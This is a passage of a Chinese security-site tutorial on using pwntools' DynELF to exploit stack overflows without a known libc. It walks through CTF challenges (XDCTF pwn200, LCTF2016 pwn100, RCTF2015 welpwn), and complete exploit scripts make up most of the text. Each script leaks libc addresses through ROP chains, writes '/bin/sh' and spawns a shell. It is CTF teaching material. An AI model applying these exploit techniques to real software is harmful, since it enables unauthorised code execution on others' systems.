YaHei&quot;;">&nbsp;3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来就直接给出利用代码。</span></p><pre class="brush:bash;toolbar:false">from&nbsp;pwn&nbsp;import&nbsp;*
+import&nbsp;binascii
+p&nbsp;=&nbsp;process(&quot;./xdctf-pwn200&quot;)
+elf&nbsp;=&nbsp;ELF(&quot;./xdctf-pwn200&quot;)
+writeplt&nbsp;=&nbsp;elf.symbols[&#39;write&#39;]
+writegot&nbsp;=&nbsp;elf.got[&#39;write&#39;]
+readplt&nbsp;=&nbsp;elf.symbols[&#39;read&#39;]
+readgot&nbsp;=&nbsp;elf.got[&#39;read&#39;]
+vulnaddress&nbsp;=&nbsp;&nbsp;0x08048484&nbsp;
+startaddress&nbsp;=&nbsp;0x080483d0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#调用start函数，用以恢复栈
+bssaddress&nbsp;=&nbsp;&nbsp;&nbsp;0x0804a020&nbsp;&nbsp;&nbsp;&nbsp;#用来写入“/bin/sh\0”字符串
+def&nbsp;leak(address):
+&nbsp;&nbsp;payload&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;112
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p32(writeplt)
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p32(vulnaddress)
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p32(1)
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p32(address)
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p32(4)
+&nbsp;&nbsp;p.send(payload)
+&nbsp;&nbsp;data&nbsp;=&nbsp;p.recv(4)
+&nbsp;&nbsp;print&nbsp;&quot;%#x&nbsp;=&gt;&nbsp;%s&quot;&nbsp;%&nbsp;(address,&nbsp;(data&nbsp;or&nbsp;&#39;&#39;).encode(&#39;hex&#39;))
+&nbsp;&nbsp;return&nbsp;data
+print&nbsp;p.recvline()
+dynelf&nbsp;=&nbsp;DynELF(leak,&nbsp;elf=ELF(&quot;./lctf-pwn200&quot;))
+systemAddress&nbsp;=&nbsp;dynelf.lookup(&quot;__libc_system&quot;,&nbsp;&quot;libc&quot;)&nbsp;
+print&nbsp;&quot;systemAddress:&quot;,&nbsp;hex(systemAddress)
+#调用_start函数，恢复栈
+payload1&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;112
+payload1&nbsp;+=&nbsp;p32(startaddress)&nbsp;
+p.send(payload1)
+print&nbsp;p.recv()
+ppprAddress&nbsp;=&nbsp;0x0804856c&nbsp;&nbsp;#获取到的连续3次pop操作的gadget的地址&nbsp;
+payload1&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;112
+payload1&nbsp;+=&nbsp;p32(readplt)
+payload1&nbsp;+=&nbsp;p32(ppprAddress)
+payload1&nbsp;+=&nbsp;p32(0)
+payload1&nbsp;+=&nbsp;p32(bssaddress)
+payload1&nbsp;+=&nbsp;p32(8)
+payload1&nbsp;+=&nbsp;p32(systemAddress)&nbsp;+&nbsp;p32(vulnaddress)&nbsp;+&nbsp;p32(bssaddress)
+p.send(payload1)
+p.send(&#39;/bin/sh\0&#39;)
+p.interactive()</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">LCTF2016-pwn100</span></strong></span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">本题是64位linux下的二进制程序，无cookie，也存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，但和上一题相比，存在两处差异：</span><br style="text-align: left;"/></p><p style="text-align: left; text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1）64位linux下的函数需要通过rop链将参数传入寄存器，而不是依靠栈布局；</span></strong></span></p><p style="text-align: left; text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2）puts函数与write函数不同，不能指定输出字符串的长度。</span></strong></span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">根据上文给出的解决方法，构造利用脚本如下。</span></p><pre class="brush:bash;toolbar:false">from&nbsp;pwn&nbsp;import&nbsp;*
+import&nbsp;binascii
+p&nbsp;=&nbsp;process(&quot;./pwn100&quot;)
+elf&nbsp;=&nbsp;ELF(&quot;./pwn100&quot;)
+readplt&nbsp;=&nbsp;elf.symbols[&#39;read&#39;]
+readgot&nbsp;=&nbsp;elf.got[&#39;read&#39;]
+putsplt&nbsp;=&nbsp;elf.symbols[&#39;puts&#39;]
+putsgot&nbsp;=&nbsp;elf.got[&#39;puts&#39;]
+mainaddress&nbsp;=&nbsp;&nbsp;&nbsp;0x4006b8
+startaddress&nbsp;=&nbsp;&nbsp;&nbsp;0x400550
+poprdi&nbsp;=&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x400763
+pop6address&nbsp;&nbsp;=&nbsp;&nbsp;0x40075a&nbsp;&nbsp;&nbsp;
+movcalladdress&nbsp;=&nbsp;0x400740
+waddress&nbsp;=&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x601000&nbsp;#可写的地址，bss段地址在我这里好像不行，所以选了一个别的地址，应该只要不是readonly的地址都可以&nbsp;&nbsp;
+def&nbsp;leak(address):
+&nbsp;&nbsp;count&nbsp;=&nbsp;0
+&nbsp;&nbsp;data&nbsp;=&nbsp;&#39;&#39;
+&nbsp;&nbsp;payload&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;64&nbsp;+&nbsp;&quot;A&quot;&nbsp;*&nbsp;8
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(poprdi)&nbsp;+&nbsp;p64(address)
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(putsplt)
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(startaddress)
+&nbsp;&nbsp;payload&nbsp;=&nbsp;payload.ljust(200,&nbsp;&quot;B&quot;)
+&nbsp;&nbsp;p.send(payload)
+&nbsp;&nbsp;print&nbsp;p.recvuntil(&#39;bye~\n&#39;)
+&nbsp;&nbsp;up&nbsp;=&nbsp;&quot;&quot;
+&nbsp;&nbsp;while&nbsp;True:
+&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;=&nbsp;p.recv(numb=1,&nbsp;timeout=0.5)
+&nbsp;&nbsp;&nbsp;&nbsp;count&nbsp;+=&nbsp;1
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;up&nbsp;==&nbsp;&#39;\n&#39;&nbsp;and&nbsp;c&nbsp;==&nbsp;&quot;&quot;:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;data[:-1]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;+=&nbsp;&quot;\x00&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
+&nbsp;&nbsp;&nbsp;&nbsp;else:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;+=&nbsp;c
+&nbsp;&nbsp;&nbsp;&nbsp;up&nbsp;=&nbsp;c
+&nbsp;&nbsp;data&nbsp;=&nbsp;data[:4]
+&nbsp;&nbsp;log.info(&quot;%#x&nbsp;=&gt;&nbsp;%s&quot;&nbsp;%&nbsp;(address,&nbsp;(data&nbsp;or&nbsp;&#39;&#39;).encode(&#39;hex&#39;)))
+&nbsp;&nbsp;return&nbsp;data
+d&nbsp;=&nbsp;DynELF(leak,&nbsp;elf=ELF(&#39;./pwn100&#39;))
+systemAddress&nbsp;=&nbsp;d.lookup(&#39;__libc_system&#39;,&nbsp;&#39;libc&#39;)
+print&nbsp;&quot;systemAddress:&quot;,&nbsp;hex(systemAddress)
+print&nbsp;&quot;-----------write&nbsp;/bin/sh&nbsp;to&nbsp;bss--------------&quot;
+payload1&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;64&nbsp;+&nbsp;&quot;A&quot;&nbsp;*&nbsp;8
+payload1&nbsp;+=&nbsp;p64(pop6address)&nbsp;+&nbsp;p64(0)&nbsp;+&nbsp;p64(1)&nbsp;+&nbsp;p64(readgot)&nbsp;+&nbsp;p64(8)&nbsp;+&nbsp;p64(waddress)&nbsp;+&nbsp;p64(0)
+payload1&nbsp;+=&nbsp;p64(movcalladdress)
+payload1&nbsp;+=&nbsp;&#39;\x00&#39;*56
+payload1&nbsp;+=&nbsp;p64(startaddress)
+payload1&nbsp;=&nbsp;&nbsp;payload1.ljust(200,&nbsp;&quot;B&quot;)
+p.send(payload1)
+print&nbsp;p.recvuntil(&#39;bye~\n&#39;)
+p.send(&quot;/bin/sh\x00&quot;)
+print&nbsp;&quot;-----------get&nbsp;shell--------------&quot;
+payload2&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;64&nbsp;+&nbsp;&quot;A&quot;&nbsp;*&nbsp;8
+payload2&nbsp;+=&nbsp;p64(poprdi)&nbsp;+&nbsp;p64(waddress)
+payload2&nbsp;+=&nbsp;p64(systemAddress)
+payload2&nbsp;+=&nbsp;p64(startaddress)
+payload2&nbsp;=&nbsp;&nbsp;payload2.ljust(200,&nbsp;&quot;B&quot;)
+p.send(payload2)
+p.interactive()</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">RCTF2015-welpwn</span></strong></span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">本题也是64位linux下的二进制程序，无cookie，也存在明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，与其他两题的区别主要在于利用过程比较绕。</span><br style="text-align: left;"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;整个程序逻辑是这样的，main函数中，用户可以输入1024个字节，并通过echo函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以“\x00”作为字符串终止符，故如果我们的payload中存在这个字符，则不会复制成功；但实际情况是，因为要用到上面提到的通用gadget来为write函数传参，故肯定会在payload中包含“\x00”字符。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;这个题目设置了这个障碍，也为这个障碍的绕过提供了其他条件。即由于echo函数的栈空间很小，与main函数栈中的输入字符串之间只间隔32字节，故我们可以利用这一点，只复制过去24字节数据加上一个包含连续4个pop指令的gadget地址，并借助这个gadget跳过原字符串的前32字节数据，即可进入我们正常的通用gadget调用过程，具体脚本如下。</span></p><pre class="brush:bash;toolbar:false">from&nbsp;pwn&nbsp;import&nbsp;*
+import&nbsp;binascii
+p&nbsp;=&nbsp;process(&quot;./welpwn&quot;)
+elf&nbsp;=&nbsp;ELF(&quot;welpwn&quot;)
+readplt&nbsp;=&nbsp;elf.symbols[&quot;read&quot;]
+readgot&nbsp;=&nbsp;elf.got[&quot;read&quot;]
+writeplt&nbsp;=&nbsp;elf.symbols[&quot;write&quot;]
+writegot&nbsp;=&nbsp;elf.got[&quot;write&quot;]
+startAddress&nbsp;=&nbsp;&nbsp;&nbsp;&nbsp;0x400630
+popr12r13r14r15&nbsp;&nbsp;=&nbsp;0x40089c
+pop6address&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0x40089a
+movcalladdress&nbsp;&nbsp;=&nbsp;0x400880
+def&nbsp;leak(address):
+&nbsp;&nbsp;print&nbsp;p.recv(1024)
+&nbsp;&nbsp;payload&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;24
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(popr12r13r14r15)
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(pop6address)&nbsp;+&nbsp;p64(0)&nbsp;+&nbsp;p64(1)&nbsp;+&nbsp;p64(writegot)&nbsp;+&nbsp;p64(8)&nbsp;+&nbsp;p64(address)&nbsp;+&nbsp;p64(1)
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(movcalladdress)
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;&quot;A&quot;&nbsp;*&nbsp;56
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(startAddress)
+&nbsp;&nbsp;payload&nbsp;=&nbsp;&nbsp;payload.ljust(1024,&nbsp;&quot;C&quot;)
+&nbsp;&nbsp;p.send(payload)
+&nbsp;&nbsp;data&nbsp;=&nbsp;p.recv(4)
+&nbsp;&nbsp;print&nbsp;&quot;%#x&nbsp;=&gt;&nbsp;%s&quot;&nbsp;%&nbsp;(address,&nbsp;(data&nbsp;or&nbsp;&#39;&#39;).encode(&#39;hex&#39;))
+&nbsp;&nbsp;return&nbsp;data
+dynelf&nbsp;=&nbsp;DynELF(leak,&nbsp;elf=ELF(&quot;./welpwn&quot;))
+systemAddress&nbsp;=&nbsp;dynelf.lookup(&quot;__libc_system&quot;,&nbsp;&quot;libc&quot;)
+print&nbsp;hex(systemAddress)
+bssAddress&nbsp;=&nbsp;0x601070
+poprdi&nbsp;=&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x4008a3
+print&nbsp;p.recv(1024)
+payload&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;24
+payload&nbsp;+=&nbsp;p64(popr12r13r14r15)
+payload&nbsp;+=&nbsp;p64(pop6address)&nbsp;+&nbsp;p64(0)&nbsp;+&nbsp;p64(1)&nbsp;+&nbsp;p64(readgot)&nbsp;+&nbsp;p64(8)&nbsp;+&nbsp;p64(bssAddress)&nbsp;+&nbsp;p64(0)
+payload&nbsp;+=&nbsp;p64(movcalladdress)
+payload&nbsp;+=&nbsp;&quot;A&quot;&nbsp;*&nbsp;56
+payload&nbsp;+=&nbsp;p64(poprdi)
+payload&nbsp;+=&nbsp;p64(bssAddress)
+payload&nbsp;+=&nbsp;p64(systemAddress)
+payload&nbsp;=&nbsp;payload.ljust(1024,&nbsp;&quot;C&quot;)
+p.send(payload)
+p.send(&quot;/bin/sh\x00&quot;)
+p.interactive()</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">由于该题目程序中也包含puts函数，故我们也可以用puts函数来实现leak，代码如下。</span></p><pre class="brush:bash;toolbar:false">def&nbsp;leak(address):
+&nbsp;&nbsp;count&nbsp;=&nbsp;0
+&nbsp;&nbsp;data&nbsp;=&nbsp;&#39;&#39;
+&nbsp;&nbsp;print&nbsp;p.recv(1024)
+&nbsp;&nbsp;payload&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;24
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(popr12r13r14r15)
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(poprdi)&nbsp;+&nbsp;p64(address)
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(putsplt)
+&nbsp;&nbsp;payload&nbsp;+=&nbsp;p64(startAddress)
+&nbsp;&nbsp;payload&nbsp;=&nbsp;payload.ljust(1020,&nbsp;&quot;B&quot;)
+&nbsp;&nbsp;p.send(payload)
+&nbsp;&nbsp;#由于echo函数最后会输出复制过去的字符串，而该字符串是popr12r13r14r15，故我们可以将该gadget的地址作为判断输出结束的依据
+&nbsp;&nbsp;print&nbsp;p.recvuntil(&quot;\x9c\x08\x40&quot;)&nbsp;
+&nbsp;&nbsp;up&nbsp;=&nbsp;&quot;&quot;
+&nbsp;&nbsp;while&nbsp;True:
+&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;=&nbsp;p.recv(1)
+&nbsp;&nbsp;&nbsp;&nbsp;count&nbsp;+=&nbsp;1
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;up&nbsp;==&nbsp;&#39;\n&#39;&nbsp;and&nbsp;c&nbsp;==&nbsp;&quot;W&quot;:&nbsp;#下一轮输出的首字母就是“Welcome”中的“W”
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;data[:-1]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;+=&nbsp;&quot;\x00&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
+&nbsp;&nbsp;&nbsp;&nbsp;else:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;+=&nbsp;c
+&nbsp;&nbsp;&nbsp;&nbsp;up&nbsp;=&nbsp;c
+&nbsp;&nbsp;data&nbsp;=&nbsp;data[:4]
+&nbsp;&nbsp;print&nbsp;&quot;%#x&nbsp;=&gt;&nbsp;%s&quot;&nbsp;%&nbsp;(address,&nbsp;(data&nbsp;or&nbsp;&#39;&#39;).encode(&#39;hex&#39;))
+&nbsp;&nbsp;return&nbsp;data</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">参考文章</span></strong></span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"></span></strong></span></p><hr/><p style="text-align: left; text-indent: 2em;"><a href="http://klaus.link/2016/Python-Pwntools-DynELF%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: none;">Pwntools中的DynELF模块的使用</a></p><p style="text-align: left; text-indent: 2em;"><a href="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: none;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Finding&nbsp;Function&#39;s&nbsp;Load&nbsp;Address</span></a></p><p style="text-align: left; text-indent: 2em;"><a href="http://www.cnblogs.com/Ox9A82/p/5487725.html" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: none;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;__libc_csu_init函数的通用gadget</span></a></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp; &nbsp;</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">&nbsp;附件</span></strong></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: none;">题目打包下载</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: none;">：</span><a href="http://pan.baidu.com/s/1qXA9JXi" _src="http://pan.baidu.com/s/1qXA9JXi" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; text-decoration: none;">http://pan.baidu.com/s/1qXA9JXi</a></p><p><br style="text-align: left;"/></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/3298.html
+                </p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】借助DynELF实现无libc的漏洞利用小结 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3298" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/7x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="14703" user-name="吃瓜群众" href="javascript:;">
+                吃瓜群众            </a>
+                        <span class="comment-time">2017-06-24 00:28:28</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="14703">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_14703" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">got里只有puts没有write的时候你怎么玩。。不动脑子么</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+<div class="clearfix re-comment">
+    <div class="comment-quote">  
+        <div class="comment-user">
+            <a href="javascript:;" class="response" data-bind-id="0" data-target="13089">王一航</a> <span class="comment-time">2017-04-07 19:49:19</span>            <div class="comment-action">                        <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="13089">回复</a></span>&nbsp;|&nbsp;                        <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13089" data-type="comment">点赞</a></span>            </div>
+            <p>为啥要分析 puts 函数这种情况呢 ？ puts 函数不是还调用了 write 函数吗 ， 这样根据延迟绑定的机制 ， 当 puts 函数调用的时候 ， write 的 got 表就已经被设置了呀 ， 那么我们是不是就可以直接通过 write 函数来对目标的内存空间进行搜索而不是使用 put 函数 ， write 函数可以指定输出的长度 ， 这样似乎更方便呀</p>
+        </div>
+    </div>
+        </div>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/10x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="13089" user-name="王一航" href="javascript:;">
+                王一航            </a>
+                        <span class="comment-time">2017-04-07 19:49:19</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="13089">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13089" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">为啥要分析 puts 函数这种情况呢 ？ puts 函数不是还调用了 write 函数吗 ， 这样根据延迟绑定的机制 ， 当 puts 函数调用的时候 ， write 的 got 表就已经被设置了呀 ， 那么我们是不是就可以直接通过 write 函数来对目标的内存空间进行搜索而不是使用 put 函数 ， write 函数可以指定输出的长度 ， 这样似乎更方便呀</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t018fc2200a809a7add.jpg'/>              
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="245645961" class="response" data-bind-id="245645961" data-target="7207" user-name="twittered" href="javascript:;">
+                twittered            </a>
+                        <span class="comment-time">2016-12-17 21:39:29</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="245645961" data-target="7207">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_7207" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">收藏～～～～～～～～～～</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/2x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="2796348634" class="response" data-bind-id="2796348634" data-target="7163" user-name="rac_cp" href="javascript:;">
+                rac_cp            </a>
+                        <span class="comment-time">2016-12-15 18:21:39</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="2796348634" data-target="7163">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_7163" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">这个可以有，收藏了</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+
+        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3298" data-page="2">查看更多</a>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
